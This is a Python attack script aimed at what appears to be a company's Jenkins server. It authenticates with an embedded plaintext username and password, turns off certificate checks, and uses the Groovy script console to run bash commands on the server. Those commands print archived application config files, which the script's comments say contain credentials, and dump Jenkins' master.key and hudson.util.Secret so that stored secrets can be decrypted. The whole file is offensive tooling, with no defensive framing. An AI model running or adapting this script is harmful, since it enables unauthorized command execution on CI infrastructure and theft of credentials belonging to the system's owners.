import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def run_groovy(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    r = opener.open(req, timeout=15)
    crumb = json.loads(r.read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
        headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']})
    r2 = opener.open(req2, timeout=90)
    return r2.read().decode()

# Read T1Pagos local.php (the actual config with credentials)
print("=" * 60)
print("T1PAGOS local.php (Build 2 - latest)")
print("=" * 60)
q1 = '''
println ["bash","-c","cat '/var/jenkins_home/jobs/cs_new_front/jobs/cs_new_pipe_build_t1pagos-api-config/builds/2/archive/Microservicios/Box/t1/Dev/config/autoload/local.php'"].execute().text
'''
print(run_groovy(q1))

print("=" * 60)
print("T1PAGOS local.php.dist (Build 2)")
print("=" * 60)
q2 = '''
println ["bash","-c","cat '/var/jenkins_home/jobs/cs_new_front/jobs/cs_new_pipe_build_t1pagos-api-config/builds/2/archive/Microservicios/Box/t1/Dev/config/autoload/local.php.dist'"].execute().text
'''
print(run_groovy(q2))

print("=" * 60)
print("T1PAGOS dependencies.global.php (Build 2)")
print("=" * 60)
q3 = '''
println ["bash","-c","cat '/var/jenkins_home/jobs/cs_new_front/jobs/cs_new_pipe_build_t1pagos-api-config/builds/2/archive/Microservicios/Box/t1/Dev/config/autoload/dependencies.global.php'"].execute().text
'''
print(run_groovy(q3))

# Get master.key and hudson.util.Secret for credential decryption
print("=" * 60)
print("MASTER.KEY")
print("=" * 60)
q4 = '''
println ["bash","-c","cat /var/jenkins_home/secrets/master.key"].execute().text
'''
print(run_groovy(q4))

print("=" * 60)
print("HUDSON.UTIL.SECRET (base64)")
print("=" * 60)
q5 = '''
println ["bash","-c","base64 -w0 /var/jenkins_home/secrets/hudson.util.Secret"].execute().text
'''
print(run_groovy(q5))
